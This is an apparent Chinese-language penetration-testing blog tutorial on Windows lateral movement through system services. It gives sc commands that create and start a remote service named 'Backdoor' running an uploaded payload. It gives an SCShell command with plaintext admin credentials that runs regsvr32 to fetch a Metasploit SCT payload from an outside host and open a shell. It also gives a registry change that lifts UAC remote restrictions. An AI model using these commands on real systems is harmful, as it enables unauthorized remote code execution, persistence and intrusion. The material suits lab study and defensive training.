---
title: "利用系统服务"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# 利用系统服务

### 创建远程服务

通过创建系统服务，在远程主机上运行指定的程序或命令，需要拥有两端主机的管理员权限和IPC连接，步骤如下：

* 利用已建立的共享连接向远程主机上传恶意文件

* 利用建立的IPC连接在远程主机上创建系统服务：

  ~~~cmd
  sc \\192.168.111.137 create Backdoor binpath= "cmd.exe /k C:\payload.exe"
  ~~~

  ![image-20241025195541348](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025195544008-911126823.png)

  可以查看一下：

  ![image-20241025195600423](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025195602784-523166092.png)

* 启动服务：

  ~~~cmd
  sc \\192.168.111.137 start Backdoor
  ~~~

  ![image-20241025200429686](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025200432186-1724163783.png)

  会提示错误但依然成功上线：

  ![image-20241025200415023](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025200417712-1741014667.png)

* 攻击结束后删除服务：

  ~~~cmd
  sc \\192.168.111.137 delete Backdoor
  ~~~

  ![image-20241025200520631](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025200522911-922418011.png)

### SCShell

一款无文件横向移动工具：[Mr-Un1k0d3r/SCShell: Fileless lateral movement tool that relies on ChangeServiceConfigA to run command](https://github.com/Mr-Un1k0d3r/SCShell)

使用时需要提供远程主机管理员的用户凭据，并且需要已知远程主机上的系统服务名称

这里以通过regsvr32执行外部SCT文件的方式上线远程主机：

* msf启动一个web delivery，生成用于regsvr32执行的payload：
  ![image-20241025202602805](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025202605610-728597086.png)

* 通过SCShell在远程主机上执行生成的payload：

  ~~~cmd
  SCShell.exe 192.168.111.137 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32 /s /n /u /i:http://192.168.205.151:8080/j489QXQfibPzj3E.sct scrobj.dll" yuy0ung.com administrator Admin123456
  ~~~

  ![image-20241025203517127](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025203520059-2014856216.png)

  成功上线msf：

  ![image-20241025203607524](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241025203610537-611515815.png)

SharoNoPSExec的利用思路与此相似，也可以看看

### UAC Remote Restrictions

UAC（用户账户控制）使计算机用户能够以非管理员身份执行日常任务。当用户以本地用户远程运行需要管理员用户的程序，都只能使用本地用户中RID为500(Adminitrator)的管理员用户来运行

如果测试人员进行需要管理员权限的远程管理操作（schtask、psexec、wmi、winRM、PTH......），除了域管理员用户，其他任何用户包括非RID500的管理员用户都会提示“拒绝访问”

需要注意的是**该限制对域管用户无效，只限制本地用户**

重启系统关闭UAC(或许能成，但是写入的服务没有双引号指定路径)

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

